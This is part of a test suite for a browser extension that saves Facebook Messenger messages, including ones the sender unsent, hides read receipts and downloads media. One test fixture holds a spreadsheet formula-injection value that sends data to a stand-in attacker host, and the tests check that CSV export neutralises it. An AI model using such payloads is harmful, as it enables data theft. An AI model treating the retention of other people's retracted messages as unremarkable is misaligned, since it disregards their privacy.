+    assert.equal(reply.attachments.length, 0, 'quoted photo not attached to the reply');
+
+    // the big thumbs-up "like"
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006401', sender: 'Khondoker Aurthe', time: '3:32 PM', like: true }));
+    const like = await waitFor(async () => (await dbAll('messages')).find((m) => m.domId === 'msgr.7460000000000006401'), { what: 'like saved' });
+    assert.equal(like.text, '👍');
+  });
+
+  await t.test('other UI languages: no wrong match from a repeated clock time or a common greeting', async () => {
+    await page.evaluate(() => {
+      fb.openPopup({ logId: 'log-kim', title: 'Kim Le', profileId: '400000000000001', label: 'Tin nhắn trong cuộc trò chuyện với Kim Le', generic: 'Tin nhắn' });
+      fb.inLog('log-kim', (f) => {
+        f.addMessage({ domId: '400000000000001@msgr.7460000000000006601', sender: 'Kim Le', time: '21:01', labelPrefix: 'Lúc', text: 'my new password is Tr0ub4dor' });
+        f.addMessage({ domId: '400000000000001@msgr.7460000000000006602', sender: 'Kim Le', time: '21:05', labelPrefix: 'Lúc', text: 'chào buổi sáng nhé' });
+        f.addMessage({ domId: '400000000000001@msgr.7460000000000006603', sender: 'Kim Le', time: '21:06', labelPrefix: 'Lúc', text: 'the alarm code is 1234' });
+      });
+    });
+    await waitFor(async () => (await dbAll('messages')).some((m) => m.text === 'the alarm code is 1234'), { what: 'Kim messages saved' });
+    await page.evaluate(() => fb.inLog('log-kim', (f) => {
+      f.unsendInPlace('400000000000001@msgr.7460000000000006601', '400000000000001@msgr.7460000000000006601', 'Kim Le đã thu hồi một tin nhắn');
+      f.unsendInPlace('400000000000001@msgr.7460000000000006603', '400000000000001@msgr.7460000000000006603', 'Kim Le đã thu hồi một tin nhắn');
+    }));
+    await waitFor(async () => (await dbAll('messages')).filter((m) => m.threadKey === '400000000000001' && m.unsent).length === 2, { what: 'both unsends saved' });
+    // those were saved yesterday
+    await dash.evaluate(async () => {
+      const db = await import('/lib/db.js');
+      const day = 86400000;
+      await db.withStores(['messages'], 'readwrite', async (s) => {
+        const all = await db.reqP(s.messages.index('threadKey').getAll('400000000000001'));
+        for (const m of all) s.messages.put({ ...m, capturedAt: m.capturedAt - day, ts: m.ts - day });
+      });
+    });
+    // today: the same clock time with unrelated neighbours, and the same greeting before another message
+    await page.evaluate(() => fb.inLog('log-kim', (f) => {
+      f.clear && 0;
+      f.addMessage({ domId: '400000000000001@msgr.7460000000000006700', sender: 'Kim Le', time: '21:00', labelPrefix: 'Lúc', text: 'unrelated words here' });
+      f.addMessage({ domId: '400000000000001@msgr.7460000000000006701', sender: 'Kim Le', time: '21:01', labelPrefix: 'Lúc', placeholder: 'Kim Le đã thu hồi một tin nhắn' });
+      f.addMessage({ domId: '400000000000001@msgr.7460000000000006702', sender: 'Kim Le', time: '09:15', labelPrefix: 'Lúc', text: 'chào buổi sáng nhé' });
+      f.addMessage({ domId: '400000000000001@msgr.7460000000000006703', sender: 'Kim Le', time: '09:16', labelPrefix: 'Lúc', placeholder: 'Kim Le đã thu hồi một tin nhắn' });
+    }));
+    for (const id of ['6701', '6703']) {
+      const box = await waitFor(async () => page.evaluate((i) => {
+        const b = document.querySelector(`[data-message-id="400000000000001@msgr.746000000000000${i}"] .mms-recovered`);
+        return b && b.textContent;
+      }, id), { what: 'box for ' + id });
+      assert.match(box, /No saved copy/, id + ' must not show another message: ' + box);
+    }
+  });
+
+  await t.test('Messenger notifications are kept as a backup copy', async () => {
+    await page.evaluate(() => {
+      try {
+        new Notification('Khondoker Aurthe', { body: 'notification text' });
+      } catch (e) {
+        /* permission */
+      }
+    });
+    const n = await waitFor(async () => (await dbAll('notifications')).find((x) => x.body === 'notification text'), { what: 'notification saved' });
+    assert.equal(n.title, 'Khondoker Aurthe');
+  });
+
+  await t.test('dashboard lists recovered messages; popup shows counts', async () => {
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#unsent`);
+    await waitFor(async () => {
+      const text = await dash.textContent('#unsent-list');
+      return text.includes('network secret') && text.includes('screen secret');
+    }, { what: 'dashboard cards' });
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#thread=${THREAD}`);
+    await waitFor(async () => (await dash.textContent('#thread-messages')).includes('network secret'), { what: 'chat view' });
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
+    await waitFor(async () => (await dash.textContent('#diag')).includes('gateway'), { what: 'diagnostics table' });
+
+    const popup = await ctx.newPage();
+    popup.on('pageerror', (e) => errors.push('popup: ' + e.message));
+    await popup.goto(`chrome-extension://${extId}/popup/popup.html`);
+    await waitFor(async () => Number(await popup.textContent('#s-unsent')) >= 3, { what: 'popup unsent count' });
+    // the popup lists the 3 most recently unsent messages that were kept
+    const latest = (await dbAll('messages')).filter((m) => m.unsent && m.text).sort((a, b) => b.unsentAt - a.unsentAt)[0];
+    await waitFor(async () => (await popup.textContent('#recent-list')).includes(latest.text), { what: 'popup recent list' });
+    assert.ok((await popup.locator('#recent-list li').count()) <= 3);
+    await popup.close();
+  });
+
+  await t.test('a row with a large photo album is split, saved, and capture keeps going', async () => {
+    // 3 photos of ~9 MB in one row: more than one message to the background can carry at once
+    await page.evaluate(() => {
+      const big = (seed) => {
+        const bytes = new Uint8Array(9 * 1024 * 1024);
+        for (let i = 0; i < bytes.length; i += 512) bytes[i] = (i / 512 + seed * 37) & 255;
+        return URL.createObjectURL(new Blob([bytes], { type: 'image/png' }));
+      };
+      fb.addMessage({ domId: '100012345678901@msgr.7460000000000006501', sender: 'Khondoker Aurthe', time: '3:40 PM', text: 'album', photo: big(1) });
+      const row = document.querySelector('[data-message-id="100012345678901@msgr.7460000000000006501"] .bubble');
+      for (let i = 2; i <= 3; i++) row.insertAdjacentHTML('beforeend', `<div role="presentation"><img alt="Open photo" width="800" height="600" src="${big(i)}"></div>`);
+    });
+    const album = await waitFor(async () => {
+      const m = (await dbAll('messages')).find((x) => x.domId === 'msgr.7460000000000006501');
+      return m && m.attachments.filter((a) => a.mediaKey).length === 3 ? m : null;
+    }, { timeout: 30000, what: 'all three album photos stored' });
+    assert.equal(album.text, 'album');
+    await page.evaluate(() => fb.addMessage({ domId: '100012345678901@msgr.7460000000000006502', sender: 'Khondoker Aurthe', time: '3:41 PM', text: 'after the album' }));
+    await waitFor(async () => (await dbAll('messages')).some((m) => m.text === 'after the album'), { what: 'capture still running after a huge row' });
+  });
+
+  await t.test('backup with photos restores everything (one piece and line by line)', async () => {
+    const result = await dash.evaluate(async () => {
+      const db = await import('/lib/db.js');
+      const before = await db.quickTotals();
+      const { blob, photos } = await db.exportBlob({ includeMedia: true });
+      const file = new File([blob], 'backup.json', { type: 'application/json' });
+      await db.clearAll();
+      const emptied = await db.quickTotals();
+      await db.importFile(file, null, { streamAbove: Number.MAX_SAFE_INTEGER }); // whole-file path
+      const once = await db.quickTotals();
+      await db.clearAll();
+      await db.importFile(file, null, { streamAbove: 0 }); // line-by-line path used for huge backups
+      const twice = await db.quickTotals();
+      return { before, emptied, once, twice, photos };
+    });
+    assert.equal(result.emptied.messages, 0);
+    assert.equal(result.photos, result.before.media, 'every stored photo exported');
+    assert.ok(result.photos >= 4, 'photos exported: ' + result.photos);
+    assert.deepEqual(result.once, result.before);
+    assert.deepEqual(result.twice, result.before);
+  });
+
+  await t.test('data safety: shared photos survive deleting one chat; deletion is complete; CSV has no formulas; restore merges', async () => {
+    const r = await dash.evaluate(async () => {
+      const db = await import('/lib/db.js');
+      const blob = new Blob([new Uint8Array([1, 2, 3, 4])], { type: 'image/png' });
+      const msg = (key, threadKey, text, mediaKey) =>
+        db.finalizeMessage({ key, threadKey, text, ts: Date.now(), capturedAt: Date.now(), attachments: mediaKey ? [{ kind: 'screen-image', fbid: 'shared', mediaKey }] : [], history: [], sources: ['screen'], unsent: true, unsentAt: Date.now() });
+      await db.withStores(['messages', 'media', 'events', 'notifications', 'pendingMedia', 'threads'], 'readwrite', async (s) => {
+        s.media.put({ key: 'fbid:shared', blob, mime: 'image/png', size: 4, messageKey: 'dm:A1', savedAt: Date.now() });
+        s.messages.put(msg('dm:A1', 'chatA', 'secret in A', 'fbid:shared'));
+        s.messages.put(msg('dm:B1', 'chatB', '=HYPERLINK("https://attacker.example/?d="&A1,"Open")', 'fbid:shared'));
+        s.threads.put({ threadKey: 'chatA', domName: 'Chat A' });
+        s.events.add({ type: 'unsent', messageKey: 'dm:A1', threadKey: 'chatA', at: Date.now(), text: 'secret in A', recovered: true });
+        s.notifications.add({ title: 'Chat A', body: 'secret in A', ts: Date.now() });
+        s.pendingMedia.put({ id: 'dm:A1|x', messageKey: 'dm:A1', url: 'https://scontent.xx.fbcdn.net/x.jpg', fbid: 'x', addedAt: Date.now(), tries: 0 });
+      });
+      await db.deleteThread('chatA', { name: 'Chat A' });
+      const afterA = {
+        mediaStillThere: !!(await db.getMedia('fbid:shared')),
+        eventsWithA: (await db.getAll('events')).filter((e) => (e.text || '').includes('secret in A')).length,
+        notifWithA: (await db.getAll('notifications')).filter((n) => (n.body || '').includes('secret in A')).length,
+        pendingForA: (await db.getAll('pendingMedia')).filter((j) => j.messageKey === 'dm:A1').length,
+      };
+      // restoring the same backup twice must not duplicate anything
+      const { blob: backup } = await db.exportBlob({ includeMedia: true });
+      const file = new File([backup], 'b.json');
+      const n0 = (await db.getAll('notifications')).length;
+      const e0 = (await db.getAll('events')).length;
+      await db.importFile(file);
+      await db.importFile(file);
+      const dup = { notifications: (await db.getAll('notifications')).length - n0, events: (await db.getAll('events')).length - e0 };
+      await db.deleteThread('chatB', { name: '' });
+      return { afterA, dup, mediaAfterB: !!(await db.getMedia('fbid:shared')) };
+    });
+    assert.deepEqual(r.afterA, { mediaStillThere: true, eventsWithA: 0, notifWithA: 0, pendingForA: 0 });
+    assert.deepEqual(r.dup, { notifications: 0, events: 0 });
+    assert.equal(r.mediaAfterB, false, 'photo removed once no chat uses it');
+
+    // CSV: a message starting with "=" is written as text, not as a formula
+    await dash.evaluate(async () => {
+      const db = await import('/lib/db.js');
+      await db.withStores(['messages'], 'readwrite', async (s) => s.messages.put(db.finalizeMessage({ key: 'dm:F1', threadKey: 'chatF', text: '=1+1', ts: Date.now(), capturedAt: Date.now(), attachments: [], history: [], sources: ['screen'] })));
+    });
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
+    const [download] = await Promise.all([dash.waitForEvent('download'), dash.click('#export-csv')]);
+    const csv = fs.readFileSync(await download.path(), 'utf8');
+    assert.ok(csv.includes("'=1+1"), 'formula neutralised: ' + csv.split('\n').find((l) => l.includes('1+1')));
+  });
+
+  await t.test('UX: popup hint only when needed, paused state is honest, deletes clear the screen, settings stay in sync', async () => {
+    const popup = await ctx.newPage();
+    popup.on('pageerror', (e) => errors.push('popup: ' + e.message));
+    await popup.setViewportSize({ width: 360, height: 600 });
+    await popup.goto(`chrome-extension://${extId}/popup/popup.html`);
+    await popup.waitForTimeout(1600);
+    assert.equal(await popup.isVisible('#reload-hint'), false, 'no false "reload this tab" warning');
+    const btn = await popup.locator('#open-dashboard').boundingBox();
+    assert.ok(btn && btn.y >= 0 && btn.y + btn.height <= 600, 'main button inside the 600 px popup: ' + JSON.stringify(btn));
+
+    // pause from the popup: switches lock, the note explains, Seen is no longer held back
+    await popup.click('header .switch input[data-setting="enabled"]');
+    await waitFor(async () => popup.isVisible('#paused-note'), { what: 'paused note' });
+    assert.equal(await popup.isDisabled('input[data-setting="blockSeen"]'), true);
+
+    // the Settings page follows at once
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
+    await waitFor(async () => dash.isVisible('#paused-banner'), { what: 'paused banner on the Saved Messages page' });
+    await popup.click('header .switch input[data-setting="enabled"]');
+    await waitFor(async () => !(await dash.isVisible('#paused-banner')), { what: 'banner gone after resuming' });
+    await popup.click('input[data-setting="blockSeen"]');
+    await waitFor(async () => !(await dash.isChecked('#view-settings input[data-setting="blockSeen"]')), { what: 'settings page shows the popup change' });
+    assert.equal(await dash.isDisabled('#view-settings input[data-setting="stealthFocus"]'), true, 'Strong mode locked while Unseen is off');
+    await popup.click('input[data-setting="blockSeen"]');
+    await popup.close();
+
+    // deleting a chat clears it from the screen, also in a second Saved Messages tab
+    const dash2 = await ctx.newPage();
+    await dash2.goto(`chrome-extension://${extId}/dashboard/dashboard.html#thread=200000000000001`);
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#thread=200000000000001`);
+    await waitFor(async () => (await dash.textContent('#thread-messages')).includes('4321'), { what: 'Bob chat open' });
+    await waitFor(async () => (await dash2.textContent('#thread-messages')).includes('4321'), { what: 'Bob chat open in a second tab' });
+    await dash.click('#delete-thread');
+    await dash.click('#confirm-ok');
+    await waitFor(async () => !(await dash.textContent('#thread-messages')).includes('4321'), { what: 'deleted chat no longer on screen' });
+    await waitFor(async () => !(await dash2.textContent('#thread-messages')).includes('4321'), { what: 'deleted chat gone from the other tab too' });
+    await dash2.close();
+
+    // Chrome's "Options" entry opens Settings
+    const opt = await ctx.newPage();
+    await opt.goto(`chrome-extension://${extId}/dashboard/options.html`);
+    await waitFor(async () => opt.url().endsWith('#settings') && (await opt.isVisible('#view-settings')), { what: 'options -> settings' });
+    await opt.close();
+  });
+
+  await t.test('downloads: feed videos (every data layout), reels, photos, encrypted-chat photos, right-click', async () => {
+    await setSettings({ enabled: true, downloadButtons: true, downloadQuality: 'hd', downloadAsk: false });
+    await page.bringToFront();
+    const worker = () => ctx.serviceWorkers().find((w) => w.url().startsWith(`chrome-extension://${extId}/`)) || sw;
+    // record what the extension hands to Chrome's downloader
+    const patch = () =>
+      worker().evaluate(() => {
+        if (self.__mmsDlPatched) return true;
+        self.__mmsDlPatched = true;
+        self.__mmsDl = [];
+        const orig = chrome.downloads.download.bind(chrome.downloads);
+        chrome.downloads.download = (opts) => {
+          self.__mmsDl.push(opts);
+          return orig(opts);
+        };
+        return true;
+      });
+    await patch();
+    const calls = () => worker().evaluate(() => self.__mmsDl || []);
+    const button = page.locator('[data-mms="download"] .btn');
+    const toast = page.locator('[data-mms="download"] .toast');
+    const pressDownload = async (selector) => {
+      await page.mouse.move(5, 5);
+      await button.waitFor({ state: 'hidden', timeout: 5000 });
+      await page.hover(selector);
+      await button.waitFor({ state: 'visible', timeout: 5000 });
+      const label = await button.textContent();
+      const n = (await calls()).length;
+      await button.click();
+      return { label, n };
+    };
+    const nextCall = async (n, what) => {
+      try {
+        return await waitFor(async () => (await calls())[n], { what });
+      } catch (e) {
+        throw new Error(e.message + ' | message on screen: ' + (await toast.textContent().catch(() => '?')) + ' | calls: ' + JSON.stringify((await calls()).map((c) => c.url)));
+      }
+    };
+
+    const V = 'https://video-sin6-1.xx.fbcdn.net/v/t42.1790-2/';
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate((V) => fb.addFeedVideo({ id: '1111111111', hd: V + 'hd1.mp4?_nc_ht=x&oh=1', sd: V + 'sd1.mp4?_nc_ht=x&oh=1' }), V);
+    let r = await pressDownload('[role="article"] .player-overlay');
+    assert.equal(r.label, '⬇ Video');
+    let call = await nextCall(r.n, 'player-props video download');
+    assert.equal(call.url, V + 'hd1.mp4?_nc_ht=x&oh=1', 'HD file from the player data, not the blob: address');
+    assert.equal(call.filename, 'Facebook/facebook-video-1111111111-hd.mp4');
+    assert.equal(call.saveAs, false);
+    await waitFor(async () => /saved to Downloads/.test(await toast.textContent()), { what: 'success message' });
+
+    // the layout Facebook uses in its page data (videoDeliveryLegacyFields)
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate((V) => fb.addFeedVideo({ id: '1111111112', hd: V + 'hd2.mp4?x=1', sd: V + 'sd2.mp4?x=1', shape: 'legacy' }), V);
+    r = await pressDownload('[role="article"] .player-overlay');
+    call = await nextCall(r.n, 'legacy-fields download');
+    assert.equal(call.url, V + 'hd2.mp4?x=1');
+
+    // the newer layout (progressive_urls), with "Smaller (SD)" chosen
+    await setSettings({ downloadQuality: 'sd' });
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate((V) => fb.addFeedVideo({ id: '1111111113', hd: V + 'hd3.mp4?x=1', sd: V + 'sd3.mp4?x=1', shape: 'progressive' }), V);
+    r = await pressDownload('[role="article"] .player-overlay');
+    call = await nextCall(r.n, 'progressive_urls download');
+    assert.equal(call.url, V + 'sd3.mp4?x=1', 'SD when the user chose smaller files');
+    assert.equal(call.filename, 'Facebook/facebook-video-1111111113-sd.mp4');
+    await setSettings({ downloadQuality: 'hd' });
+
+    // only DASH: separate picture and sound tracks, best of each
+    const mpd =
+      '<?xml version="1.0"?><MPD><Period><AdaptationSet mimeType="video/mp4">' +
+      `<Representation bandwidth="400000" height="360"><BaseURL>${V}v360.mp4?a=1&amp;b=2</BaseURL></Representation>` +
+      `<Representation bandwidth="2000000" height="1080"><BaseURL>${V}v1080.mp4?a=1&amp;b=2</BaseURL></Representation>` +
+      '</AdaptationSet><AdaptationSet mimeType="audio/mp4">' +
+      `<Representation bandwidth="64000"><BaseURL>${V}a64.mp4?a=1</BaseURL></Representation>` +
+      `<Representation bandwidth="128000"><BaseURL>${V}a128.mp4?a=1</BaseURL></Representation>` +
+      '</AdaptationSet></Period></MPD>';
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate(({ mpd }) => fb.addFeedVideo({ id: '1111111114', dash: mpd, shape: 'dash' }), { mpd });
+    r = await pressDownload('[role="article"] .player-overlay');
+    await nextCall(r.n + 1, 'two DASH downloads');
+    const two = (await calls()).slice(r.n, r.n + 2);
+    assert.deepEqual(
+      two.map((c) => [c.url, c.filename]),
+      [
+        [V + 'v1080.mp4?a=1&b=2', 'Facebook/facebook-video-1111111114-picture-only.mp4'],
+        [V + 'a128.mp4?a=1', 'Facebook/facebook-video-1111111114-sound-only.m4a'],
+      ]
+    );
+
+    // a reel thumbnail (a picture linking to /reel/ID): the reel's own page is read for its file
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate(() => fb.addPhoto({ src: 'https://scontent.xx.fbcdn.net/v/t15/reelthumb_n.jpg?stp=dst-jpg_s320x320&oh=1', link: '/reel/987654321/' }));
+    r = await pressDownload('[role="article"] img');
+    assert.equal(r.label, '⬇ Reel');
+    call = await nextCall(r.n, 'reel download');
+    assert.equal(call.url, 'https://video-x.xx.fbcdn.net/v/t42/reelhd.mp4?_nc=1&oh=9');
+    assert.equal(call.filename, 'Facebook/facebook-reel-987654321-hd.mp4');
+
+    // a photo: the largest copy in the page's data, same picture (same file name)
+    await page.evaluate(() => fb.clearMain());
+    const small = 'https://scontent.xx.fbcdn.net/v/t39.30808-6/123_456_789_n.jpg?stp=dst-jpg_s320x320&oh=1';
+    const big = 'https://scontent.xx.fbcdn.net/v/t39.30808-6/123_456_789_n.jpg?stp=dst-jpg_s2048x2048&oh=2';
+    await page.evaluate(({ small, big }) => fb.addPhoto({ src: small, big }), { small, big });
+    r = await pressDownload('[role="article"] img');
+    assert.equal(r.label, '⬇ Photo');
+    call = await nextCall(r.n, 'photo download');
+    assert.equal(call.url, big, 'largest copy');
+    assert.equal(call.filename, 'Facebook/facebook-photo-123_456_789_n.jpg');
+
+    // a photo from an encrypted chat exists only inside the tab: saved by the tab itself
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate((b64) => fb.addBlobPhoto(b64), PNG_1x1);
+    await page.mouse.move(5, 5);
+    await button.waitFor({ state: 'hidden', timeout: 5000 });
+    await page.hover('#page-main img');
+    await button.waitFor({ state: 'visible', timeout: 5000 });
+    const [file] = await Promise.all([page.waitForEvent('download', { timeout: 10000 }), button.click()]);
+    assert.match(file.suggestedFilename(), /^facebook-photo-\d{8}-\d{6}\.png$/);
+
+    // no file anywhere: an honest message, no download
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate(() => fb.addFeedVideo({ id: '2222222222', shape: 'none' }));
+    r = await pressDownload('[role="article"] .player-overlay');
+    await waitFor(async () => /did not give a file/.test(await toast.textContent()), { what: 'no-file message' });
+    assert.equal((await calls()).length, r.n, 'nothing downloaded');
+
+    // right-click → "Download this photo or video" on a link to a reel
+    const before = (await calls()).length;
+    await worker().evaluate(async () => {
+      const [tab] = await chrome.tabs.query({ url: 'https://www.facebook.com/*' });
+      await chrome.tabs.sendMessage(tab.id, { type: 'download-context', linkUrl: 'https://www.facebook.com/reel/987654321/?s=ifu', srcUrl: '', mediaType: '' });
+    });
+    call = await nextCall(before, 'right-click reel download');
+    assert.equal(call.url, 'https://video-x.xx.fbcdn.net/v/t42/reelhd.mp4?_nc=1&oh=9');
+
+    // only Facebook's own servers, and the button goes away when turned off
+    const guard = await dash.evaluate(async () => {
+      const m = await import('/lib/downloads.js');
+      return [m.isDownloadableUrl('https://video.xx.fbcdn.net/v/a.mp4'), m.isDownloadableUrl('https://evil.example/x.fbcdn.net/a.mp4'), m.isDownloadableUrl('https://fbcdn.net.evil.example/a.mp4'), m.isDownloadableUrl('http://video.xx.fbcdn.net/a.mp4')];
+    });
+    assert.deepEqual(guard, [true, false, false, false]);
+    await setSettings({ downloadButtons: false });
+    await page.evaluate(() => fb.clearMain());
+    await page.evaluate((V) => fb.addFeedVideo({ id: '1111111115', hd: V + 'hd5.mp4?x=1' }), V);
+    await new Promise((res) => setTimeout(res, 300));
+    await page.mouse.move(5, 5);
+    await page.hover('[role="article"] .player-overlay');
+    await new Promise((res) => setTimeout(res, 500));
+    assert.equal(await button.isVisible().catch(() => false), false, 'no button when turned off');
+    const menus = await worker().evaluate(() => new Promise((res) => chrome.contextMenus.update('mms-download', {}, () => res(chrome.runtime.lastError ? 'gone' : 'there'))));
+    assert.equal(menus, 'gone', 'right-click entry removed too');
+    await setSettings({ downloadButtons: true });
+    await page.evaluate(() => fb.clearMain());
+
+    // Settings → Downloads: the quality choice is stored as 'hd' / 'sd'
+    await dash.goto(`chrome-extension://${extId}/dashboard/dashboard.html#settings`);
+    const quality = '#view-settings select[data-setting="downloadQuality"]';
+    assert.equal(await dash.inputValue(quality), 'hd');
+    await dash.selectOption(quality, 'sd');
+    await waitFor(async () => (await dash.evaluate(async () => (await import('/lib/settings.js')).getSettings())).downloadQuality === 'sd', { what: 'quality saved' });
+    await dash.selectOption(quality, 'hd');
+    await waitFor(async () => (await dash.evaluate(async () => (await import('/lib/settings.js')).getSettings())).downloadQuality === 'hd', { what: 'quality back to HD' });
+  });
+
+  await t.test('no script errors anywhere', async () => {
+    assert.deepEqual(errors, []);
+  });
+});
